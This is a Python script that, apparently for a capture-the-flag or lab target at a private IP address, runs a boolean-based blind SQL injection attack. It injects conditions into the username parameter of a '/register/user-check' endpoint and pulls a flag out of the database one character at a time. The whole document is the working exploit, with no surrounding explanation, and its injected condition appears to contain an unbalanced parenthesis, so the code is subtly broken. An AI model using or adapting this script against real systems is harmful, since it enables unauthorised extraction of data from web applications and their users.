import urllib.request
import urllib.parse

target = "http://10.67.179.8"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}:_-!@#$%^&*()+=,./?;'[]<>|`~ "

def test_condition(condition):
    params = urllib.parse.urlencode({"username": f"' OR ({condition})-- -"})
    url = f"{target}/register/user-check?{params}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = resp.read().decode()
            return '"available":false' in data
    except Exception as e:
        return False

flag = ""
print("Extracting flag from /register/user-check...")
for pos in range(1, 100):
    found = False
    for c in charset:
        if c == "'":
            continue
        cond = f"SELECT SUBSTRING(flag,{pos},1) FROM flag)='{c}'"
        if test_condition(cond):
            flag += c
            print(f"  [{pos}] = '{c}' -> {flag}")
            found = True
            break
    if not found:
        print(f"Stopped at position {pos}, flag so far: {flag}")
        break

print(f"\nFLAG: {flag}")
